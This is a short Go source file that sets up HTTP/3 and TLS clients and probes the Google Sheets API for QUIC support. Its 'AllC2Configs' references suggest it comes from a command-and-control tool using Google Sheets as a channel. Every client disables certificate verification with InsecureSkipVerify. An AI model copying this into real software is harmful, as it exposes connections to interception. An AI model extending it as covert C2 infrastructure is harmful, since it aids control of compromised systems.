package common

import (
	"crypto/tls"
	"net/http"

	"github.com/quic-go/quic-go/http3"
)

var QuicRoundTripper = &http3.RoundTripper{
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true,
	},
}
var TlsTransport = &http.Transport{
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true,
	},
}

// HTTPClient interface
type HTTPClient interface {
	Do(req *http.Request) (*http.Response, error)
}

func QuicSupport() bool {

	// Create a new HTTP client that supports QUIC.
	roundTripper := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	defer roundTripper.Close()
	quicClient := &http.Client{
		Transport: roundTripper,
	}
	AllC2Configs.Debug.LogDebug("Trying to make a QUIC request to the Google Sheets API...")
	// Try to make a QUIC request to the Google Sheets API.
	_, err := quicClient.Get("https://sheets.googleapis.com/v4/spreadsheets/")
	if err != nil {
		AllC2Configs.Debug.LogDebug("Error: " + err.Error())
		return false
	} else {
		AllC2Configs.Debug.LogDebug("QUIC supported")
		return true
	}
}

// GetHTTPClient returns a HTTP client
func GetHTTPClient() http.Client {
	// Create a new HTTP client that supports QUIC if it's enabled
	if QuicSupport() && AllC2Configs.Google.EnableHTTP3 {
		AllC2Configs.Debug.LogDebug("QUIC supported")
		return http.Client{
			Transport: QuicRoundTripper,
		}
	} else {
		AllC2Configs.Debug.LogDebug("QUIC not supported, using TLS instead")
		return http.Client{
			Transport: TlsTransport,
		}
	}
}
